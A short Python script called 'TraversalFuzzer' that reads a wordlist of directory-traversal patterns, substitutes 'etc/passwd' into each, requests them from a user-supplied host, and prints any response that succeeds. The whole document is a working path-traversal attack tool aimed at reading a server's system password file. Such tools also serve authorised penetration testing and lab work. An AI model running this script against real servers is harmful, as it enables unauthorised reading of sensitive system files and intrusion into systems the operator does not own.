import argparse
import requests 

fuzzyword = 'etc/passwd'
parser = argparse.ArgumentParser(
    prog='TraversalFuzzer',
    description='../../',
    
    
)
parser.add_argument('-u', type=str, help="URL")
parser.add_argument('-w', type=str, help="wordlist with traversals")
args = parser.parse_args()

with open(args.w, "r") as f:
    for fuzz in f:
        payload = fuzz.strip().replace('{FILE}', fuzzyword)
        r = requests.get(f'http://{args.u}/{payload}')
        if r.status_code == 200:   
            print(r.text)
